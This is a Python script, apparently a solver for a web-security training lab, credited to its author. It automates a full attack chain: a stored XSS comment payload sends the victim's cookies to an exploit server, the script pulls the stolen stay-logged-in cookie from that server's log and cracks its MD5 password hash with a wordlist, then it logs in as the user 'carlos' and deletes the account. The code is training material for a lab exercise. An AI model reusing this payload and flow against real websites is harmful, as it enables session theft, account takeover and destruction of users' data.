import requests
from colorama import Fore, Style, init
import hashlib
import re
import base64
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event, Lock


class LabSolver:
    def __init__(self, lab_url, exploit_server_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = exploit_server_url if exploit_server_url.endswith('/') else exploit_server_url + '/'
        self.session = requests.Session()
        init()
        self.passwords_file = 'custom_passwords.txt'
        self.victim_username = 'carlos'
        self.victim_password = None
        self.passwords = []
        self.hashes = []
        self.victim_hash = None
        self.found = Event()
        self.lock = Lock()

    @staticmethod
    def hash_string_to_md5(input_string):
        md5_hash = hashlib.md5()
        md5_hash.update(input_string.encode('utf-8'))
        hashed_string = md5_hash.hexdigest()

        return hashed_string

    def open_passwords_file(self):
        with (open(self.passwords_file) as file):
            for password in file.readlines():
                password = password.strip()
                md5_hash = self.hash_string_to_md5(password)
                self.passwords.append(password)
                self.hashes.append(md5_hash)

    def get_carlos_hash_using_xss(self):
        data = {
            'postId': '1',
            'name': 'hacker',
            'email': 'hacker@hacker.com',
            'website': 'https://hacker.com',
            'comment': '<script>document.location=\'{}\'+document.cookie</script>'.format(self.exploit_server_url)
        }
        self.session.post(self.lab_url + 'post/comment', data=data)
        response = self.session.get(self.exploit_server_url + 'log')
        result = re.findall('GET /secret=(.*)HTTP/1.1', response.text)[0]
        carlos_hash = base64.urlsafe_b64decode(result.split('stay-logged-in=')[-1]).decode().split(':')[1]
        self.victim_hash = carlos_hash
        print(self.victim_hash)

    def brute_force_carlos_password(self, md5_hash, password):
        with self.lock:
            if self.found.is_set():
                return
            if md5_hash == self.victim_hash:
                print(Fore.GREEN + '[+] ' + Style.RESET_ALL + password)
                self.victim_password = password
                self.found.set()
            else:
                print(Fore.RED + '[-] ' + Style.RESET_ALL + password)

    def brute_force_carlos_passwords(self):
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.brute_force_carlos_password, md5_hash, password)
                       for md5_hash, password in zip(self.hashes, self.passwords)]
            for _ in as_completed(futures):
                if self.found.is_set():
                    break

    def sign_in_as_carlos_and_delete_account(self):
        data = {
            'username': self.victim_username,
            'password': self.victim_password
        }
        self.session.post(self.lab_url + 'login', data=data)
        data = {
            'password': self.victim_password
        }
        self.session.post(self.lab_url + 'my-account/delete', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.open_passwords_file()
        self.get_carlos_hash_using_xss()
        self.brute_force_carlos_passwords()
        self.sign_in_as_carlos_and_delete_account()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1], sys.argv[2])
lab_solver.solve()
